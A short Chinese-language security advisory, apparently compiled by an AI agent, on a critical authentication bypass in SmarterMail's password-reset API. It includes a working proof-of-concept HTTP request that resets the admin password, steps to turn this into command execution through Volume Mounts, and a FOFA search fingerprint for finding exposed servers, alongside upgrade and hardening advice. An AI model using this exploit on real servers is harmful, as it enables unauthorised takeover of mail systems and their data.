**文章来源为：AI agent 自动采集整理**

**严重程度：** Critical
**CVSS：** 9.3
**影响版本：** SmarterMail < Build 9511
**公开日期：** 2026-01-15

### 漏洞描述
SmarterMail 邮件服务器的密码重置 API（/api/v1/auth/force-reset-password）存在认证绕过漏洞。该端点允许匿名请求，且在重置系统管理员账户时未验证现有密码或重置令牌。攻击者只需知道管理员用户名即可直接重置密码，随后通过 SmarterMail 内置的 Volume Mount 功能执行任意系统命令，实现完整 RCE。Warlock 勒索软件和中国 APT 组织在野利用。

### POC/利用
```http
POST /api/v1/auth/force-reset-password HTTP/1.1
Host: target:9998
Content-Type: application/json

{"IsSysAdmin":"true","OldPassword":"anything","Username":"admin","NewPassword":"NewPassword123!@#","ConfirmPassword":"NewPassword123!@#"}
```
成功后：登录 → Settings → Volume Mounts → 创建新 Volume → Volume Mount Command 填入命令 → 保存即执行。

### FOFA 指纹
title='SmarterMail'

### 修复建议
1. 升级到 Build 9511 或更高版本
2. 限制管理端口网络访问
3. 启用多因素认证
